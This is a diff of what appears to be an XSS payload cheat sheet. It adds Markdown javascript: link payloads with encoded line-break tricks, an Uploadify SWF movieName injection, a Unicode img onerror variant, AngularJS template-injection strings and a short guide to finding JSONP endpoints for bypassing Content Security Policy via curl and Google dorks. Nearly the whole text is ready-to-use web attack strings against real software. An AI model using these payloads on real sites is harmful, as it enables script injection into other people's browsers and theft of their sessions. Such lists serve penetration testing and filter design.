@@ -95,11 +95,15 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 **Markdown XSS**
 
 ```md
-[a](javascript:confirm(1)
+[a](javascript:confirm(1))
 ```
 
 ```md
 [a](javascript://www.google.com%0Aprompt(1))
+```
+
+```md
+[a](javascript://%0d%0aconfirm(1))
 ```
 
 ```md
@@ -109,6 +113,15 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 ```md
 [a](javascript:window.onerror=confirm;throw%201)
 ```
+
+```md
+[a]: (javascript:prompt(1))
+```
+
+```md
+[a]:(javascript:alert(1))           //Add SOH Character
+```
+
 
 **Flash SWF XSS**
 
@@ -138,9 +151,11 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 
 - SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`
 
+- Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`
+
 - FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`
 
-_Note: Useful reference on constructing Flash-based XSS payloads from [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._
+_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._
 
 **Lightweight Markup Languages**
 
@@ -167,7 +182,7 @@ __ javascript:alert(document.domain)
 **Unicode characters**
 
 ```html
-†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
+†‡•＜img src=a onerror=javascript:alert('test')>…‰€
 ```
 
 **AngularJS Template Injection based XSS**
@@ -299,4 +314,22 @@ __ javascript:alert(document.domain)
 
 ```js
 {{constructor.constructor('alert(1)')()}}
+```
+
+**Content Security Policy (CSP) bypass via JSONP endpoints**
+
+Grab the target's CSP:
+
+```
+curl -I http://example.com | grep 'Content-Security-Policy'
+```
+
+Either paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the "Content Security Policy" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.
+
+![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)
+
+Now we can use a Google dork to find some JSONP endpoints on the domains listed above.
+
+```
+site:example.com inurl:callback
 ```
